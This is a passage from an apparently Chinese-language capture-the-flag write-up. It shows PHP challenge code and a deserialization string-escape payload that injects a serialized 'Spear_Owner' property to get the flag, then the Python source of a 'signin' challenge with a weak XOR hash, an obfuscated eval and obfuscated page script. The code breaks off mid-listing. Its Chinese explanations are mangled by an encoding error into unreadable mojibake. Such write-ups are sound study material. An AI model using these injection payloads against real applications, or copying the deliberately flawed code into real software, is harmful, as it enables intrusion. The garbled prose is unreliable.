<span class="token string double-quoted-string">"Lovesickness"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_er_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Heartbreak"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_san_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Blind_Dragon"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_si_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Romantic_charm"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_wu_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Peerless"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_liu_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"White_Dragon"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_qi_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Penetrating_Gaze"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_ba_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Kunpeng"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_jiu_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Night_Parade_of_a_Hundred_Ghosts"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_shi_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Overlord"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_shi_yi_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Letting_Go"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_shi_er_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Decisive_Victory"</span><span class="token punctuation">,</span>        <span class="token string double-quoted-string">"di_shi_san_qiang"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"Unrepentant_Lethality"</span>    <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">Make_a_Move</span><span class="token punctuation">(</span><span class="token variable">$move</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token variable">$Top_Secret_Long_Spear_Techniques_Manual</span> <span class="token keyword">as</span> <span class="token variable">$index</span> <span class="token operator">=></span> <span class="token variable">$movement</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$move</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token variable">$index</span><span class="token punctuation">,</span> <span class="token variable">$movement</span><span class="token punctuation">,</span> <span class="token variable">$move</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$move</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$Chant</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$Spear_Owner</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Nobody'</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$chant</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Chant</span> <span class="token operator">=</span> <span class="token variable">$chant</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Spear_Owner</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Nobody'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">Spear_Owner</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'MaoLei'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string single-quoted-string">'Far away from COOL...'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token string double-quoted-string">"Omg You're So COOOOOL!!! "</span> <span class="token operator">.</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'FLAG'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p>é—®é¢˜çš„å…³é”®ï¼Œå…³é”®çš„é—®é¢˜ï¼Œå°±å¾ˆæ˜æ˜¾äº†ï¼Œå­˜åœ¨ä¸€ä¸ªé™æ€å¼•ç”¨å‡½æ•°Make_a_Move()å…¶ä¸­çš„</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$move</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token variable">$index</span><span class="token punctuation">,</span> <span class="token variable">$movement</span><span class="token punctuation">,</span> <span class="token variable">$move</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#å­˜åœ¨ååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸ï¼Œä¸å¯æ§çš„åç¼€å˜çš„å¯æ§åˆ¶</span></code></pre><pre class="language-bash" data-language="bash"><code class="language-bash">ç›®çš„æ˜¯åœ¨å¤ºå‘½åä¸‰æªåé¢ä¿®æ”¹ä¸º<span class="token string">";s:11:"</span>Spear_Owner<span class="token string">";s:6:"</span>MaoLei<span class="token string">";&#125;ï¼Œè¯¥å­—ç¬¦ä¸²é•¿åº¦ä¸º35ï¼Œæ ¹æ®ä»£ç å¯ä»¥çŸ¥é“"</span>di_qi_qiang<span class="token string">" => "</span>Penetrating_Gaze<span class="token string">",åˆšå¥½æ˜¯ä»11->16ï¼Œæ¯æ¬¡è½¬æ¢å¯ä»¥é€ƒé€¸5ä¸ªå­—ç¬¦ä¸²ï¼Œåªéœ€è¦é‡å¤7æ¬¡"</span>di_qi_qiang<span class="token string">"å³å¯å®Œæˆé€ƒé€¸chant=di_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiang"</span><span class="token punctuation">;</span>s:11:<span class="token string">"Spear_Owner"</span><span class="token punctuation">;</span>s:6:<span class="token string">"MaoLei"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h1 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h1><p>CHALLENGE: signin<br>DESCRIPTION: çœŸçš„æ˜¯signinï¼ˆ<br><strong>æœ¬é¢˜æ— éœ€æ‰«æå™¨&#x2F;çˆ†ç ´</strong></p><p>é¢˜ç›®ä»£ç :</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> secrets <span class="token keyword">import</span> users<span class="token punctuation">,</span> salt<span class="token keyword">import</span> hashlib<span class="token keyword">import</span> base64<span class="token keyword">import</span> json<span class="token keyword">import</span> http<span class="token punctuation">.</span>server<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    FLAG <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">gethash</span><span class="token punctuation">(</span><span class="token operator">*</span>items<span class="token punctuation">)</span><span class="token punctuation">:</span>    c <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> items<span class="token punctuation">:</span>        <span class="token keyword">if</span> item <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        c <span class="token operator">^</span><span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">.</span>from_bytes<span class="token punctuation">(</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>salt<span class="token punctuation">&#125;</span></span><span class="token string">[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>item<span class="token punctuation">&#125;</span></span><span class="token string">]</span><span class="token interpolation"><span class="token punctuation">&#123;</span>salt<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"big"</span><span class="token punctuation">)</span> <span class="token comment"># it looks so complex! but is it safe enough?</span>    <span class="token keyword">return</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token keyword">assert</span> <span class="token string">"admin"</span> <span class="token keyword">in</span> users<span class="token keyword">assert</span> users<span class="token punctuation">[</span><span class="token string">"admin"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"admin"</span>hashed_users <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span><span class="token punctuation">(</span>k<span class="token punctuation">,</span>gethash<span class="token punctuation">(</span>k<span class="token punctuation">,</span>v<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> k<span class="token punctuation">,</span>v <span class="token keyword">in</span> users<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">.</span>to_bytes<span class="token punctuation">(</span><span class="token number">0x636d616f686e69656e61697563206e6965756e63696165756e6320696175636e206975616e6363616361766573206164</span><span class="token operator">^</span><span class="token number">8651845801355794822748761274382990563137388564728777614331389574821794036657729487047095090696384065814967726980153</span><span class="token punctuation">,</span><span class="token number">160</span><span class="token punctuation">,</span><span class="token string">"big"</span><span class="token punctuation">,</span>signed<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token boolean">None</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token string">"\x00"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># what is it?</span>    <span class="token keyword">def</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>data<span class="token punctuation">:</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            data <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># ummm...? It looks like it's just base64 encoding it 5 times? truely?</span>        <span class="token keyword">return</span> data__page__ <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token string">"PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgIDx0aXRsZT5zaWduaW48L3RpdGxlPgogICAgPHNjcmlwdD4KICAgICAgICBbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoK3t9K1tdKVsrISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXVtbXV0rW10pWytbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoW10rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKVshK1tdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKShbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXSshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyhbXStbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKCFbXStbXSlbIStbXSshIVtdXSsoW10re30pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSkpWyErW10rISFbXSshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0pKCErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKChbXSt7fSlbK1tdXSlbK1tdXSsoIStbXSshIVtdKyEhW10rW10pKyhbXVtbXV0rW10pWyErW10rISFbXV0pKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXSt7fSlbKyEhW11dKygre30rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSkKICAgICAgICB2YXIgXzB4ZGI1ND1bJ3N0cmluZ2lmeScsJ2xvZycsJ3Bhc3N3b3JkJywnL2xvZ2luJywnUE9TVCcsJ2dldEVsZW1lbnRCeUlkJywndGhlbiddO3ZhciBfMHg0ZTVhPWZ1bmN0aW9uKF8weGRiNTRmYSxfMHg0ZTVhOTQpe18weGRiNTRmYT1fMHhkYjU0ZmEtMHgwO3ZhciBfMHg0ZDhhNDQ9XzB4ZGI1NFtfMHhkYjU0ZmFdO3JldHVybiBfMHg0ZDhhNDQ7fTt3aW5kb3dbJ2FwaV9iYXNlJ109Jyc7ZnVuY3Rpb24gbG9naW4oKXtjb25zb2xlW18weDRlNWEoJzB4MScpXSgnbG9naW4nKTt2YXIgXzB4NWYyYmViPWRvY3VtZW50W18weDRlNWEoJzB4NScpXSgndXNlcm5hbWUnKVsndmFsdWUnXTt2YXIgXzB4NGZkMjI2PWRvY3VtZW50W18weDRlNWEoJzB4NScpXShfMHg0ZTVhKCcweDInKSlbJ3ZhbHVlJ107dmFyIF8weDFjNjFkOT1KU09OW18weDRlNWEoJzB4MCcpXSh7J3VzZXJuYW1lJzpfMHg1ZjJiZWIsJ3Bhc3N3b3JkJzpfMHg0ZmQyMjZ9KTt2YXIgXzB4MTBiOThlPXsncGFyYW1zJzphdG9iKGF0b2IoYXRvYihhdG9iKGF0b2IoXzB4MWM2MWQ5KSkpKSl9O2ZldGNoKHdpbmRvd1snYXBpX2Jhc2UnXStfMHg0ZTVhKCcweDMnKSx7J21ldGhvZCc6XzB4NGU1YSgnMHg0JyksJ2JvZHknOkpTT05bXzB4NGU1YSgnMHgwJyldKF8weDEwYjk4ZSl9KVtfMHg0ZTVhKCcweDYnKV0oZnVuY3Rpb24oXzB4Mjk5ZDRkKXtjb25zb2xlW18weDRlNWEoJzB4MScpXShfMHgyOTlkNGQpO30pO30KICAgIDwvc2NyaXB0Pgo8L2hlYWQ+Cjxib2R5PgogICAgPGgxPmV6U2lnbmluPC9oMT4KICAgIDxwPlNpZ24gaW4gdG8geW91ciBhY2NvdW50PC9wPgogICAgPHA+ZGVmYXVsdCB1c2VybmFtZSBhbmQgcGFzc3dvcmQgaXMgYWRtaW4gYWRtaW48L3A+CiAgICA8cD5Hb29kIEx1Y2shPC9wPgoKICAgIDxwPgogICAgICAgIHVzZXJuYW1lIDxpbnB1dCBpZD0idXNlcm5hbWUiPgogICAgPC9wPgogICAgPHA+CiAgICAgICAgcGFzc3dvcmQgPGlucHV0IGlkPSJwYXNzd29yZCIgdHlwZT0icGFzc3dvcmQiPgogICAgPC9wPgogICAgPGJ1dHRvbiBpZCA9ICJsb2dpbiI+CiAgICAgICAgTG9naW4KICAgIDwvYnV0dG9uPgo8L2JvZHk+CjxzY3JpcHQ+CiAgICBjb25zb2xlLmxvZygiaGVsbG8/IikKICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJsb2dpbiIpLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgbG9naW4pOwo8L3NjcmlwdD4KPC9odG1sPg=="</span><span class="token punctuation">)</span>        <span class="token keyword">class</span> <span class="token class-name">MyHandler</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>server<span class="token punctuation">.</span>BaseHTTPRequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">do_GET</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> self<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/"</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>__page__<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"404 Not Found"</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"500 Internal Server Error"</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">do_POST</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> self<span class="token punctuation">.</span>path <span class="token operator">==</span> <span class="token string">"/login"</span><span class="token punctuation">:</span>                body <span class="token operator">=</span> self<span class="token punctuation">.</span>rfile<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"Content-Length"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                payload <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>body<span class="token punctuation">)</span>                params <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>decrypt<span class="token punctuation">(</span>payload<span class="token punctuation">[</span><span class="token string">"params"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span>                <span class="token keyword">if</span> params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"admin"</span><span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span>                    self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>                    self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"YOU CANNOT LOGIN AS ADMIN!"</span><span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token punctuation">)</span>                    <span class="token keyword">return</span>                <span class="token keyword">if</span> params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span> <span class="token operator">==</span> params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span>                    self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>                    self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">b"YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!"</span><span class="token punctuation">)</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"same"</span><span class="token punctuation">)</span>                    <span class="token keyword">return</span>                hashed <span class="token operator">=</span> gethash<span class="token punctuation">(</span>params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>params<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                <span class="token keyword">for</span> k<span class="token punctuation">,</span>v <span class="token keyword">in</span> hashed_users<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">if</span> hashed <span class="token operator">==</span> v<span class="token punctuation">:</span>                        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                            <span class="token string">"user"</span><span class="token punctuation">:</span>k<span class="token punctuation">,</span>                            <span class="token string">"hash"</span><span class="token punctuation">:</span>hashed<span class="token punctuation">,</span>                            <span class="token string">"flag"</span><span class="token punctuation">:</span> FLAG <span class="token keyword">if</span> k <span class="token operator">==</span> <span class="token string">"admin"</span> <span class="token keyword">else</span> <span class="token string">"flag&#123;YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG&#125;"</span>                        <span class="token punctuation">&#125;</span>                        self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">)</span>                        self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>                        self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"success"</span><span class="token punctuation">)</span>                        <span class="token keyword">return</span>                self<span class="token punctuation">.</span>send_response<span class="token punctuation">(</span><span class="token number">403</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>end_headers<span class="token punctuation">(</span><span class="token punctuation">)</span>                self<span class="token punctuation">.</span>wfile<span class="token 